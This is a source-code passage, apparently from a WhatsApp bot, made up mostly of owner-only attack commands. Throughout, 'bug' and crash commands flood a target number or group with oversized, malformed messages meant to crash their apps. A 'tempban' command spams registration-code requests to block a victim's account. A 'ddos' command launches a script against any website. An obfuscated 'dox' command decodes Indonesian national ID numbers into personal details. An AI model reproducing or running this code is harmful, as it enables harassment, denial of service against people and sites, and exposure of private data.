Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
replyz(responbug)
rxhlganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound2.mp3`)
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { "caption": `Rxhl Official`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `RxhlOfficial`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(1500)
}
replyz(`</> Success Sending ${command} to group ${Pe}`)
}
break

case 'buglocpc':{
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxxxxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
XeonOP = global.virtexpc
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `RxhlOfficial`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `RxhlOfficial`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(1500)
}
replyz(`*</> Succes 🥰*`)
}
break

case 'buglocgc':{
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 1937xxxxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
replyz(responbug)
XeonOP = global.virtexpc
for (let i = 0; i < amount; i++) {
rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `RxhlOfficial`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `RxhlOfficial`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(1500)
}
replyz(`*</> Succes 🥰*`)
}
break

case '🔥': case '♥️': case '🥰': case '🤤': case '😱': case '💝': case '😭': case '😁': case '🔥': case '😡': case '😒':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
XeonOP = global.virtexpc
rxhlganteng = await getBuffer(`https://github.com/DGXeon/Tiktokmusic-API/raw/master/tiktokmusic/sound2.mp3`)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
await sleep(500)
sendLiveLocationMessage(Pe)
await sleep(500)
sendSystemCrashMessage(Pe)
await sleep(500)
rxhl.sendMessage(Pe, { text: 'RxhL Reaction??', contextInfo:{ isForwarded: true, forwardedNewsletterMessageInfo: { newsletterJid: '120363222395675670@newsletter', newsletterName: `RxhlReaction`.repeat(10000), serverMessageId: 2 } }}, { quoted: xbug2 })
await sleep(500)
await rxhl.relayMessage(Pe, {"paymentInviteMessage": {serviceType: "FBPAY",expiryTimestamp: Date.now() + 1814400000}},{})
await sleep(500)
rxhl.sendMessage(Pe, { "caption": `Rxhl Official`, audio: rxhlganteng, mimetype: 'audio/mpeg', ptt:false,"title":`p`,"contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `RxhlOfficial`.repeat(10000),serverMessageId: 2 }}},{quoted: xbug2 })
await sleep(500)
rxhl.sendMessage(Pe, { location: { degreesLatitude: 173.282, degreesLongitude: -19.378, name: `RxhlOfficial`, address: `1.1.1.1.11`, url: `https://${XeonOP}.com`, comment: `BUG LOCATION`, jpegThumbnail: null, "contextInfo": {"forwardingScore": 99999999,"isForwarded": true,forwardedNewsletterMessageInfo: { newsletterJid: '120363144038483540@newsletter', newsletterName: `RxhlOfficial`.repeat(10000),serverMessageId: 2 }}} }, { quoted: xbug2 })
await sleep(500)
sendSystemCrashMessage(Pe)
await sleep(500)
sendListMessage(Pe)
await sleep(500)
}
replyz(`*</> Succes 🥰*`)
break

case 'tempban': {
if (!isMurbug) return replyz(global.nocreator)
if (!qtext) return replyz(`Example: ${prefix + command} 91|918xxxx`)
if (!/|/.test(qtext)) return replyz(`The data you provided is invalid!, Example: \n ${prefix + command} 91|6909137211`)
let numbers = JSON.parse(fs.readFileSync('./lib/tempban/ban.json'))
let cCode = qtext.split("|")[0]
let number = qtext.split("|")[1]
let fullNo = cCode + number
await replyz(`Success! Registration Interruption has been successfully activated to the target : ${fullNo} for an unlimited period of time. Registration interruption will be stopped if the server is restarted, shut down, or down.`)
let { state } = await useMultiFileAuthState('session')
let spam = makeWASocket({
auth: state,
mobile: true,
logger: pino({ level: 'silent' })
})
let dropNumber = async () => {
try {
let res = await spam.requestRegistrationCode({
phoneNumber: `+${fullNo}`,
phoneNumberCountryCode: cCode,
phoneNumberNationalNumber: number,
phoneNumberMobileCountryCode: 724,
})
if (res.reason === 'temporarily_unavailable') {
console.log(`Invalid Number (Possibility of Interrupted Registration): +${res.login}`)
await sleep(1000)
await dropNumber()
}
} catch (error) {
console.error(error)
}
}
numbers[fullNo] = { cCode, number };
fs.writeFileSync('./lib/tempban/ban.json', JSON.stringify(numbers, null, '\t'))
setInterval(() => {
dropNumber()
}, 400)
}
break

case 'bugparamspc':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
XeonOP = global.virtexpc
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
menuu = `🔥 BUG RXHL 🔥`
// button text
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson':""
                 },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `${menuu}`
rxhl.sendButton(Pe,  hohe, m, {
body: ewe,
footer: XeonOP
})
}
replyz(`*</> Succes 🥰*`)
break

case 'bugparamsgc':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 12xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
XeonOP = global.virtexpc
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
replyz(responbug)
for (let i = 0; i < amount; i++) {
menuu = `🔥 BUG RXHL 🔥`
// button text
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson':""
                 },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `${menuu}`
rxhl.sendButton(Pe,  hohe, m, {
body: ewe,
footer: XeonOP
})
}
replyz(`*</> Succes 🥰*`)
break

case 'bugparamsin':
if (!isMurbug) return replyz(global.nocreator)
XeonOP = global.virtexpc
menuu = `🔥 BUG RXHL 🔥`
// button text
hohe = [
  {
                'name': 'single_select',
                'buttonParamsJson':""
                 },
              {
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "",
      url: "https://www.youtube.com/@rxhlofc",
      merchant_url: "https://www.youtube.com/@rxhlofc"
   })
}
]
ewe = `${menuu}`
rxhl.sendButton(from,  hohe, m, {
body: ewe,
footer: `rxhl`
})
replyz(`*</> Succes 🥰*`)
break

case "bughomepc":
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
var etc = generateWAMessageFromContent(from, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "IYA IN"
    },
    "footer": {
      "text": "›RxhlOfficial"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'RxhlBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: from, quoted: m })
await rxhl.relayMessage(Pe, etc.message, { messageId: etc.key.id })
}
replyz('</> Succes')
break

case "bughomegc": case 'crashgc-v1': case 'crashgc-v2':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@g.us"
replyz(responbug)
for (let i = 0; i < amount; i++) {
var etc = generateWAMessageFromContent(from, proto.Message.fromObject({ viewOnceMessage: {
message: {
  "interactiveMessage": {
    "header": {
      "title": "",
      "subtitle": " "
    },
    "body": {
      "text": "IYA IN"
    },
    "footer": {
      "text": "›RxhlOfficial"
    },
    "nativeFlowMessage": {
      "buttons": [
        {
          "name": "cta_url",
          "buttonParamsJson": "{ display_text : 'RxhlBugWhatsApp', url : , merchant_url :  }"
        }
      ],
      "messageParamsJson": " ".repeat(1000000)
    }
  }
}
}
}), { userJid: from, quoted: m })
await rxhl.relayMessage(Pe, etc.message, { messageId: etc.key.id })
}
replyz('</> Succes')
break

case 'rxhlbug': case 'rxhlkeren': case 'rxhlganteng': case 'rxhlios': case 'rxhlandro':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
sleep(500)
sendLiveLocationMessage(Pe)
sleep(500)
sendSystemCrashMessage(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
sendListMessage(Pe)
sleep(500)
sendLiveLocationMessage(Pe)
sleep(500)
sendSystemCrashMessage(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'ddos':
if (!isMurbug) return replyz(global.nocreator)
if (!q.includes(' ')) return replyz(`Use Methode: .${command} <target> <time>\nExaple: .${command} example.my.id 60`)
                     const targetweb = q.substring(0, q.indexOf(' ') - 0)
                const timeweb = q.substring(q.lastIndexOf(' ') + 1) 
let moci = `*Bot is Attacking Wait for Results* 😤
• _Target_ ->  ${targetweb} 
• _Time Attack_ -> ${timeweb} `
rxhl.sendButton(from, [{
   name: "cta_url",
   buttonParamsJson: JSON.stringify({
      display_text: "Cek Websait",
      url: `${targetweb}`,
      merchant_url: `${targetweb}`
   })
}], m, {
   body: moci,
   footer: ''
})
              exec(`node ddos.js ${targetweb} ${timeweb}`, { maxBuffer: 1024 * 1024 }, (error, stdout, stderr) => {
        if (error) {
          replyz(`Error: ${error.message}`);
          return;
        }
        if (stderr) {
          replyz(`Error: ${stderr}`);
          return;
        }
        replyz(`Success\n\n• Target: ${targetweb},\n• Time: ${timeweb}`);
      });  
                         
break

case 'iosfull':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
iponcrash(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'iosfullv2':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
sendBugIos(Pe)
sleep(500)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'samsungcrash':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(200)
sendListMessage(Pe)
sendLiveLocationMessage(Pe)
sendSystemCrashMessage(Pe)
sleep(200)
ngeloc(Pe, force)
sleep(200)
sendListMessage(Pe)
sendLiveLocationMessage(Pe)
sendSystemCrashMessage(Pe)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'slayer07':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(500)
sendLiveLocationMessage(Pe)
sleep(500)
sendSystemCrashMessage(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
pirgam(Pe, bugquoteddvc)
sleep(500)
bakdok(Pe, force)
sleep(500)
penghitaman(Pe, force)
rxhl.sendMessage(Pe, {image: slayer07, caption: `SLAYER 07`},{quoted: m})
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'darkness':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(500)
sendLiveLocationMessage(Pe)
sleep(500)
sendSystemCrashMessage(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
pirgam(Pe, bugquoteddvc)
sleep(500)
bakdok(Pe, force)
sleep(500)
penghitaman(Pe, force)
rxhl.sendMessage(Pe, {document: slayer07, caption: `Darkness 㐅` },{quoted: m})
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'virkon':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendListMessage(Pe)
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(500)
sendLiveLocationMessage(Pe)
sleep(500)
sendSystemCrashMessage(Pe)
sleep(500)
iponcrash(Pe)
sleep(500)
pirgam(Pe, bugquoteddvc)
sleep(500)
bakdok(Pe, force)
sleep(500)
penghitaman(Pe, force)
rxhl.sendMessage(Pe, {image: slayer07, caption: `Virkon WhatsApp ✅`},{quoted: m})
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'dox': { //by moraxs inc
const _0x1ad75f = _0x1d50;
(function (_0x5722d4, _0x5d79c5) {
    const _0x419fb2 = _0x1d50, _0x4594e3 = _0x5722d4();
    while (!![]) {
        try {
            const _0x5287ce = parseInt(_0x419fb2(0x1ba)) / (0x182b + 0x2331 + -0x3b5b * 0x1) + parseInt(_0x419fb2(0x1bb)) / (-0xcbf * -0x1 + -0x1d20 + -0x5 * -0x347) * (parseInt(_0x419fb2(0x1a4)) / (0x14d8 + 0x1 * 0xae5 + -0x83 * 0x3e)) + -parseInt(_0x419fb2(0x1bf)) / (-0xd * 0x10d + 0x304 * -0x1 + 0x10b1) + parseInt(_0x419fb2(0x1ae)) / (-0x145 * -0x1 + -0x1 * 0x226 + 0xe6) * (-parseInt(_0x419fb2(0x1b3)) / (-0x1 * 0x1091 + 0x888 + 0x80f * 0x1)) + parseInt(_0x419fb2(0x1a8)) / (0xc92 + -0x607 * -0x5 + -0x2aae) * (-parseInt(_0x419fb2(0x199)) / (0x2 * -0x12b9 + -0x1190 * 0x1 + 0x370a)) + parseInt(_0x419fb2(0x1bc)) / (-0x25dc + -0xb92 * 0x3 + 0x489b) + parseInt(_0x419fb2(0x1a3)) / (-0x66 * 0x1c + -0xf5b + 0x1a8d);
            if (_0x5287ce === _0x5d79c5)
                break;
            else
                _0x4594e3['push'](_0x4594e3['shift']());
        } catch (_0x4e059b) {
            _0x4594e3['push'](_0x4594e3['shift']());
        }
    }
}(_0x5367, -0x5ff + -0x12 * 0x88f9 + 0x13 * 0xe253));
if (!isMurbug)
    return;
if (!q)
    return replyz(_0x1ad75f(0x1c9) + '\x20' + (prefix + command) + (_0x1ad75f(0x198) + _0x1ad75f(0x1a5)));
function _0x1d50(_0x3c301c, _0x131a9c) {
    const _0x5e5a9a = _0x5367();
    return _0x1d50 = function (_0x1e5abf, _0xd89f17) {
        _0x1e5abf = _0x1e5abf - (-0x951 * -0x1 + -0x53 * 0x2 + -0xc * 0x97);
        let _0x1a89ba = _0x5e5a9a[_0x1e5abf];
        return _0x1a89ba;
    }, _0x1d50(_0x3c301c, _0x131a9c);
}
nik = q[_0x1ad75f(0x1aa)]();
const moraxs = require(_0x1ad75f(0x1c0) + _0x1ad75f(0x1c7) + _0x1ad75f(0x1a1)), white = new Date()[_0x1ad75f(0x1b4) + 'r']()[_0x1ad75f(0x1aa)]()[_0x1ad75f(0x1b2)](-(-0x1ca1 * 0x1 + 0x983 + 0x1320)), green = nik[_0x1ad75f(0x1c2)](0x1 * -0x1a0e + 0x1399 + -0x67f * -0x1, -0x665 + 0x90e + 0x3 * -0xdf), yellow = nik[_0x1ad75f(0x1c2)](-0xbf1 + 0x1af * -0x12 + 0xe17 * 0x3, 0xd * -0x10a + -0x1466 + 0x21f0);
function _0x5367() {
    const _0x495ec9 = [
        '\x0aLahir:\x20',
        '\x0aKecamatan',
        '251772mkKAbJ',
        './lib/getd',
        'D:\x20',
        'substring',
        '\x0aProvince:',
        'length',
        '0|10|9|11|',
        '\x0aNama\x20Kabu',
        'ata/wilaya',
        'igit',
        '*Example*:',
        'split',
        '\x203216728xx',
        '1040LAXXul',
        '\x0aKelamin:\x20',
        'Perempuan',
        'kabkot',
        '4|2|5',
        'harus\x2016\x20d',
        '8|7|6|1|3|',
        '\x0aKode\x20Pos:',
        'h.json',
        '\x0aProvice\x20I',
        '12351070HwEtZc',
        '33NRugLl',
        'xxxxx',
        'Laki-laki',
        '\x0aKabupaten',
        '50309UGiCCa',
        '[\x20RXHL\x20OFC',
        'toString',
        'Nomor\x20NIK\x20',
        'matan:\x20',
        'slice',
        '137235iFAOFQ',
        '\x20--\x20',
        '\x20ID:\x20',
        'provinsi',
        'substr',
        '114OBnjVf',
        'getFullYea',
        '\x0aNama\x20Keca',
        '\x0aUniqcode:',
        'paten:\x20',
        'kecamatan',
        '\x20]\x0a\x0aNik:\x20',
        '708334MZIFmC',
        '1000yrrSlg',
        '341469uKBskL'
    ];
    _0x5367 = function () {
        return _0x495ec9;
    };
    return _0x5367();
}
if (nik[_0x1ad75f(0x1c4)] == -0x18cf + 0x3 * -0x943 + 0x34a8) {
    const xhYroT = (_0x1ad75f(0x1c5) + _0x1ad75f(0x19f) + _0x1ad75f(0x19d))[_0x1ad75f(0x197)]('|');
    let hoQumn = 0x2 * -0x2d1 + -0x1ca9 + 0x224b;
    while (!![]) {
        switch (xhYroT[hoQumn++]) {
        case '0':
            provinceid = nik[_0x1ad75f(0x1c2)](-0x186f + 0x26a * -0x1 + 0x1ad9, -0x11 * 0x151 + 0x3 * -0x7f5 + 0x2e42);
            continue;
        case '1':
            kelamin = yellow > -0xd40 + 0x1045 + 0x2dd * -0x1 ? _0x1ad75f(0x19b) : _0x1ad75f(0x1a6);
            continue;
        case '2':
            V = green < white ? '20' + green : '19' + green;
            continue;
        case '3':
            lahir = yellow > 0x1 * -0x1c68 + -0xa * -0x17 + 0x1baa ? (yellow - (-0x950 + 0x248 + 0x5c * 0x14))[_0x1ad75f(0x1aa)]()[_0x1ad75f(0x1c4)] > -0x5 * -0x301 + 0xe30 + 0xe * -0x216 ? (yellow - (-0x2137 + 0x173 * -0x13 + 0x3ce8))[_0x1ad75f(0x1aa)]() : '0' + (yellow - (-0x1d8 * -0x4 + -0xbf7 + 0x4bf))[_0x1ad75f(0x1aa)]() : yellow;
            continue;
        case '4':
            X = nik[_0x1ad75f(0x1c2)](0x19e5 + -0xdf7 + -0x5f3 * 0x2, -0xb * 0x28d + -0x1fe8 * 0x1 + -0x3c01 * -0x1);
            continue;
        case '5':
            Z = nik[_0x1ad75f(0x1c2)](-0xeb * -0x1b + 0xbad + -0x246a, 0x1202 + -0x2055 + 0xe63);
            continue;
        case '6':
            kodepos = moraxs[_0x1ad75f(0x1b8)][nik[_0x1ad75f(0x1c2)](0x1ad3 + -0x1468 + -0x66b, 0x524 + -0x1b7f + -0x151 * -0x11)][_0x1ad75f(0x1ad)](-(-0xb2 * -0xc + -0xd * -0x225 + 0x121a * -0x2));
            continue;
        case '7':
            kecamatan = moraxs[_0x1ad75f(0x1b8)][nik[_0x1ad75f(0x1c2)](0x163a + -0x242a + 0xdf0, 0x11 * -0x41 + -0xf7f * 0x1 + 0x13d6)][_0x1ad75f(0x197)](_0x1ad75f(0x1af))[0x1e9e + 0x399 + 0x13 * -0x1cd];
            continue;
        case '8':
            kecamatanId = nik[_0x1ad75f(0x1c2)](-0x2 * -0xe13 + 0x2431 + 0x931 * -0x7, 0x1e26 + 0x38e + 0x1 * -0x21ae);
            continue;
        case '9':
            kabupatenKotaId = nik[_0x1ad75f(0x1c2)](0x6 * -0x115 + 0xed * -0x4 + 0xa32, -0x192c + -0x1 * -0x189 + 0x17a7);
            continue;
        case '10':
            province = moraxs[_0x1ad75f(0x1b1)][nik[_0x1ad75f(0x1c2)](-0x649 * 0x1 + 0x5d9 * -0x1 + -0x1 * -0xc22, 0x1f04 + 0x92f * 0x3 + -0x3a8f * 0x1)];
            continue;
        case '11':
            kabupatenKota = moraxs[_0x1ad75f(0x19c)][nik[_0x1ad75f(0x1c2)](0x8c5 + -0x280 + -0x645, -0x1ea5 + -0x1 * 0xb0f + 0x14dc * 0x2)];
            continue;
        }
        break;
    }
} else
    return replyz(_0x1ad75f(0x1ab) + _0x1ad75f(0x19e) + _0x1ad75f(0x1c8));
await sleep(-0x240b * -0x1 + 0x1e3f + -0x3692), replyz(_0x1ad75f(0x1a9) + _0x1ad75f(0x1b9) + q + (_0x1ad75f(0x1a2) + _0x1ad75f(0x1c1)) + provinceid + (_0x1ad75f(0x1c3) + '\x20') + province + (_0x1ad75f(0x1a7) + _0x1ad75f(0x1b0)) + kabupatenKotaId + (_0x1ad75f(0x1c6) + _0x1ad75f(0x1b7)) + kabupatenKota + (_0x1ad75f(0x1be) + _0x1ad75f(0x1b0)) + kecamatanId + (_0x1ad75f(0x1b5) + _0x1ad75f(0x1ac)) + kecamatan + (_0x1ad75f(0x1a0) + '\x20') + kodepos + _0x1ad75f(0x19a) + kelamin + _0x1ad75f(0x1bd) + lahir + '/' + X + '/' + V + (_0x1ad75f(0x1b6) + '\x20') + Z);
}
break

case 'getnik':
if (!isMurbug) return replyz(global.nocreator)
tutor = fs.readFileSync('./lib/video/tutor.mp4')
rxhl.sendMessage(from, {video: tutor, caption: `Bot Telegram untuk mendapatkan nik target: @IDOOSINTBOT / https://t.me/IDOOSINTBOT`},{quoted: m})
break

case 'samsungfull':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
ngeloc(Pe, force)
ngeloc(Pe, force)
sleep(200)
ngeloc(Pe, force)
ngeloc(Pe, force)
sendSystemCrashMessage(Pe)
sleep(200)
ngeloc(Pe, force)
sleep(200)
ngeloc(Pe, force)
ngeloc(Pe, force)
sendSystemCrashMessage(Pe)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'samsung-brutal':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
ngeloc(Pe, force)
ngeloc(Pe, force)
ngeloc(Pe, force)
ngeloc(Pe, force)
sendSystemCrashMessage(Pe)
ngeloc(Pe, force)
ngeloc(Pe, force)
ngeloc(Pe, force)
sendSystemCrashMessage(Pe)
sleep(200)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'fatal-notif': case 'fatal-ui':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
bakdok(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
bakdok(Pe, force)
sleep(200)
bakdok(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
bakdok(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
bakdok(Pe, force)
sleep(200)
bakdok(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
ngeloc(Pe, force)
sleep(200)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'bug-brutal':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendSystemCrashMessage(Pe)
bakdok(Pe, force)
ngeloc(Pe, force)
iponcrash(Pe)
sleep(200)
sendSystemCrashMessage(Pe)
pirgam(Pe, bugquoteddvc)
sendLiveLocationMessage(Pe)
sleep(2000)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break

case 'crash-all-dvc':
if (!isMurbug) return replyz(global.nocreator)
if (!q) return replyz(`Example:\n ${prefix + command} 62xxxx|5`)
victim = qtext.split("|")[0]
amount = qtext.split("|")[1]
Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : victim.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
replyz(responbug)
for (let i = 0; i < amount; i++) {
sendSystemCrashMessage(Pe)
iponcrash(Pe)
sleep(100)
ngeloc(Pe, force)
pirgam(Pe, bugquoteddvc)
sleep(100)
sendLiveLocationMessage(Pe)
bakdok(Pe, force)
sendSystemCrashMessage(Pe)
iponcrash(Pe)
sleep(100)
ngeloc(Pe, force)
pirgam(Pe, bugquoteddvc)
sleep(100)
sendLiveLocationMessage(Pe)
bakdok(Pe, force)
}
replyz(`</> Successfully submitted the bug *${command}* Amount *${amount}*`)
break


case 'all-dvc2':
